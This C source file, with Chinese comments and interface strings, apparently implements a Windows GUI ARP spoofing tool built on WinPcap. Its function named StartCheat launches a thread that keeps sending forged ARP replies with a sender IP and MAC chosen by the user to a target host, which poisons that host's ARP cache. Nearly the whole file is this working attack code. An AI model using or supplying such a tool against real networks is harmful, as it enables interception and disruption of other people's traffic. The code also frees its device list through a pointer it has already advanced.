#include "Arp.h"
#include "Protocol.h"
#include "resource.h"

BOOL isSending = false;
ARP_HEADER ArpHeader;
ETHER_HEADER EtherHeader;


int StartCheat()
{
	if (isSending == false)
	{
		isSending = true;
		int lpParam = 0;
		HANDLE hThread = CreateThread(NULL, 0, SendArpPacket, &lpParam, 0, NULL);
		SetDlgItemText(hwnd, IDC_BUTTON1, L"停止发送");
		return 0;
	}
	else
	{
		isSending = false;
		SetDlgItemText(hwnd, IDC_BUTTON1, L"开始发送");
		return 0;
	}
		
}

DWORD WINAPI SendArpPacket(LPVOID lpParam)
{
	pcap_t *pcapHandle;
	pcap_if_t *pcapDev;
	char errContent[PCAP_ERRBUF_SIZE];
	unsigned char buff[100] = { 0 };
	FillHeaders();
	memcpy(buff, &EtherHeader, sizeof(ether_hdr));
	memcpy(buff + sizeof(ether_hdr), &ArpHeader, sizeof(arp_hdr));

	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &pcapDev, errContent) == -1)
	{
		MessageBoxA(NULL, "获得网络设备失败", "警告", MB_OK);
		return false;
	}
	pcapDev = pcapDev->next;
	//pcapDev = pcapDev->next->next->next;

	if ((pcapHandle = pcap_open(pcapDev->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errContent)) == NULL)
	{
		MessageBoxA(NULL, "打开网卡失败", "警告", MB_OK);
		return false;
	}

	while (isSending)
	{
		pcap_sendpacket(pcapHandle, buff, 100);
		Sleep(100);
		SetDlgItemText(hwnd, IDC_STATIC_LIGHT, L"发送中...");
		Sleep(100);
		SetDlgItemText(hwnd, IDC_STATIC_LIGHT, L"");
	}

	pcap_freealldevs(pcapDev);
	pcap_close(pcapHandle);
	return 0;
}

BOOL FillHeaders()
{
	DWORD IpSrc = 0;
	DWORD IpDest = 0;

	WCHAR MacSrc[18] = { 0 };
	WCHAR MacDest[18] = { 0 };

	SendMessage(GetDlgItem(hwnd, IDC_IPADDRESS1), IPM_GETADDRESS, 0, (LPARAM)&IpSrc);
	SendMessage(GetDlgItem(hwnd, IDC_IPADDRESS2), IPM_GETADDRESS, 0, (LPARAM)&IpDest);

	GetDlgItemText(hwnd, IDC_EDIT1, MacSrc, 18);
	GetDlgItemText(hwnd, IDC_EDIT2, MacDest, 18);

	//大小定基转换，网络字节序和本地字节序之间的转换
	IpSrc = htonl(IpSrc);
	memcpy(ArpHeader.SrcIp, &IpSrc, sizeof(IpSrc));

	IpDest = htonl(IpDest);
	memcpy(ArpHeader.DestIp, &IpDest, sizeof(IpDest));

	MacStrToMac(MacSrc, ArpHeader.EtherSrcHost);
	MacStrToMac(MacSrc, EtherHeader.EtherSrcHost);
	MacStrToMac(MacDest, ArpHeader.EtherDestHost);
	MacStrToMac(MacDest, EtherHeader.EtherDestHost);

	//填充其他字段
	//上层协议类型，0x0806为ARP协议
	EtherHeader.EtherType = htons(0x0806);
	//硬件类型，0x0001为以太网类型
	ArpHeader.HardwareType = htons(0x0001);
	//上层协议类型，0x0800为IP协议
	ArpHeader.ProtocolType = htons(0x0800);
	//硬件地址长度，Mac地址长度，单位为字节
	ArpHeader.HardwareLength = 0x06;
	//长层协议地址长度，单位为字节
	ArpHeader.ProtocolLength = 0x04;
	//操作类型，0x0002为ARP响应，0x0001为ARP请求
	ArpHeader.OperationCode = htons(0x0002);
	return true;
}

BOOL MacStrToMac(WCHAR *MacStr, unsigned char *Mac)
{
	WCHAR *str = MacStr;
	int i;
	int low = 0, high = 0;
	for (i = 0; i < 6; i++)
	{
		if (str[0] - L'0' >= 0 && str[0] - L'0' <= 9)
		{
			high = str[0] - L'0';
		}
		else if (str[0] - L'a' >= 0 && str[0] - L'a' <= 5)
		{
			high = str[0] - L'a' + 10;
		}
		else if (str[0] - L'A' >= 0 && str[0] - L'A' <= 5)
		{
			high = str[0] - L'A' + 10;
		}

		if (str[1] - L'0' >= 0 && str[1] - L'0' <= 9)
		{
			low = str[1] - L'0';
		}
		else if (str[1] - L'a' >= 0 && str[1] - L'a' <= 5)
		{
			low = str[1] - L'a' + 10;
		}
		else if (str[1] - L'A' >= 0 && str[1] - L'A' <= 5)
		{
			low = str[1] - L'A' + 10;
		}

		Mac[i] = high * 16 + low;
		str += 3;//两位加空格
	}
	return true;
}